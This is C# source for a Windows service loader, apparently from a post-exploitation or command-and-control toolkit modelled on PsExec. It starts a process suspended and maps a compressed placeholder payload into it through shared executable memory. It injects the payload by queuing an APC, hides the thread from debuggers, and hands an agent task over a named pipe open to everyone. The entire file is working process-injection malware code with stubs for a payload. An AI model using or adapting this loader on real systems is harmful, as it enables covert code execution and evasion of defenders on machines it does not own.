using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.ServiceProcess;
using System.Text;
using System.Web.Script.Serialization;

namespace SharpPsExecService
{
    class SharpPsExecSvc : ServiceBase
    {
        public const string _ServiceName = "csexecsvc";

        static private string nutclr = "#NUTCLR#";
        static private string task = "#TASK#";

        static void Main(string[] args)
        {
            Run(new SharpPsExecSvc());
        }

        public SharpPsExecSvc()
        {

        }

        protected override void OnStart(string[] args)
        {
            Execute();
            //dirty solution to stop the service 
            //TODO find corret way to stop process before unistall it
            Process.GetCurrentProcess().Kill();
        }

        protected override void OnStop()
        {
            base.OnStop();

        }

        /* Development 
        static void Main(string[] args)
        {
            Execute(PL_BINARY_SMB_NAMED_PIPE_AGENT);
        }
        */

        public static void Execute()
        {
            var startInfo = new Natives.STARTUPINFO();

            Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();

            Natives.LARGE_INTEGER largeinteger = new Natives.LARGE_INTEGER();
            Natives.SYSTEM_INFO info = new Natives.SYSTEM_INFO();

            IntPtr section = IntPtr.Zero;
            uint size = 0;

            IntPtr baseAddr = IntPtr.Zero;
            IntPtr viewSize = (IntPtr)size;
            IntPtr soffset = IntPtr.Zero;

            IntPtr baseAddrEx = IntPtr.Zero;
            IntPtr viewSizeEx = (IntPtr)size;

            try
            {
                if (Natives.CreateProcess(IntPtr.Zero, "#SPAWN#", IntPtr.Zero, IntPtr.Zero, false, Natives.CreateSuspended, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo))
                {

                    string pipename = GetPipeName(procInfo.dwProcessId);
                    string taskstr = Encoding.Default.GetString(DecompressDLL(Convert.FromBase64String(task)));
                    InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, new JavaScriptSerializer().Deserialize<Utility.TaskMsg>(taskstr));

                    byte[] payload = DecompressDLL(Convert.FromBase64String(nutclr));

                    //Round payload size to page size
                    Natives.GetSystemInfo(ref info);
                    size = info.dwPageSize - (uint)payload.Length % info.dwPageSize + (uint)payload.Length;
                    largeinteger.LowPart = size;

                    //Crteate section in current process
                    var status = Natives.ZwCreateSection(ref section, Natives.GenericAll, IntPtr.Zero, ref largeinteger, Natives.PAGE_EXECUTE_READWRITE, Natives.SecCommit, IntPtr.Zero);

                    //Map section to current process
                    status = Natives.ZwMapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, IntPtr.Zero, IntPtr.Zero, soffset, ref viewSize, 1, 0, Natives.PAGE_EXECUTE_READWRITE);

                    if (baseAddr != IntPtr.Zero)
                    {
                        //Copy payload to current process section
                        Marshal.Copy(payload, 0, baseAddr, payload.Length);

                        //Map remote section
                        status = Natives.ZwMapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSizeEx, 1, 0, Natives.PAGE_EXECUTE_READWRITE);

                        if (baseAddrEx != IntPtr.Zero && viewSizeEx != IntPtr.Zero)
                        {
                            //Unmap current process section
                            Natives.ZwUnmapViewOfSection(Natives.GetCurrentProcess(), baseAddr);

                            // Assign address of shellcode to the target thread apc queue
                            IntPtr th = procInfo.hThread;
                            IntPtr ptrq = Natives.ZwQueueApcThread(th, baseAddrEx, IntPtr.Zero);
                            Natives.ZwSetInformationThread(th, 1, IntPtr.Zero, 0);

                            int rest = Natives.ZwResumeThread(th, out ulong outsupn);
                            File.WriteAllText(@"c:\temp\log.txt", "OK");
                            injectionLoaderListener.Execute(procInfo.hProcess);

                        }
                        else
                        {
                            Console.WriteLine("[x] Error mapping remote section");
                            File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping remote section");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[x] Error mapping section to current process");
                        File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping section to current process");
                    }

                    Natives.CloseHandle(procInfo.hThread);
                    Natives.CloseHandle(procInfo.hProcess);
                }
                else
                {
                    Console.WriteLine("[x] Error creating process");
                    File.WriteAllText(@"c:\temp\log.txt", "[x] Error creating process");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Generic error");
                File.WriteAllText(@"c:\temp\log.txt", "[x] Generic error" + e.StackTrace);
            }

        }

        public static string GetPipeName(int pid)
        {
            string pipename = Dns.GetHostName();
            pipename += pid.ToString();
            return pipename;

        }

        public static byte[] DecompressDLL(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }
    }

    class InjectionLoaderListener
    {
        private string pipename = "";
        private bool IsStarted = false;
        private Utility.TaskMsg command = null;

        public InjectionLoaderListener(string pipename, Utility.TaskMsg command)
        {
            this.pipename = pipename;
            this.command = command;
        }

        public bool GetIsStarted()
        {
            return IsStarted;
        }

        // Server main thread
        public void Execute(IntPtr hProcess)
        {
            IsStarted = true;

            PipeSecurity ps = new PipeSecurity();
            //ps.SetAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.ReadWrite, AccessControlType.Allow));
            //ps.AddAccessRule(new PipeAccessRule(WindowsIdentity.GetCurrent().User, PipeAccessRights.FullControl, AccessControlType.Allow));
            ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));


            NamedPipeServerStream pipe = new NamedPipeServerStream(pipename, PipeDirection.InOut,
                NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 4098, 4098, ps);

            pipe.WaitForConnection();

            SendCommand(pipe, command);

        }

        private void SendCommand(NamedPipeServerStream pipe, Utility.TaskMsg task)
        {
            string command_src = new JavaScriptSerializer().Serialize(task);

            StringBuilder output = new StringBuilder();
            try
            {
                byte[] taskbyte = Encoding.Default.GetBytes(command_src);
                string taskb64 = Convert.ToBase64String(taskbyte);
                pipe.Write(Encoding.Default.GetBytes(taskb64), 0, Encoding.Default.GetBytes(taskb64).Length);
            }
            catch (IOException e)
            {
                Console.WriteLine("Error during sendcommand {0}", e.Message);
            }
            Console.WriteLine(output);
            Console.WriteLine();
        }

    }

    class Utility
    {
        public class ModuleConfig
        {
            public string Moduleclass { get; set; }
            public string Method { get; set; }
            public string[] Parameters { get; set; }
            public string Assembly { get; set; }
        }

        public class CommandConfig
        {
            public string Command { get; set; }
            public string[] Parameters { get; set; }
        }

        public class StandardConfig
        {
            public string Moduleclass { get; set; }
            public string Method { get; set; }
            public string[] Parameters { get; set; }
            public string Assembly { get; set; }
        }

        public class TaskMsg
        {
            public string Agentid { get; set; }
            public string AgentPivot { get; set; }
            public string TaskType { get; set; }
            public bool Chunked { get; set; }
            public int ChunkNumber { get; set; }
            public ModuleConfig ModuleTask { get; set; }
            public CommandConfig CommandTask { get; set; }
            public StandardConfig StandardTask { get; set; }
        }

    }

    class Natives
    {
        public const uint STARTF_USESTDHANDLES = 0x00000100;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint CreateSuspended = 0x00000004;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [Flags]
        public enum HANDLE_FLAGS : uint
        {
            None = 0,
            INHERIT = 1,
            PROTECT_FROM_CLOSE = 2
        }

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwResumeThread(IntPtr hThread, out ulong PreviousSuspendCount);

        [DllImport("kernel32", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern uint GetLastError();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr ZwQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr dwData);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr ZwSetInformationThread(IntPtr hThread, uint ThreadInformationClass, IntPtr ThreadInformation, ulong ThreadInformationLength);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("kernel32.dll")]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, [In] ref System.Threading.NativeOverlapped lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags);

    }
}
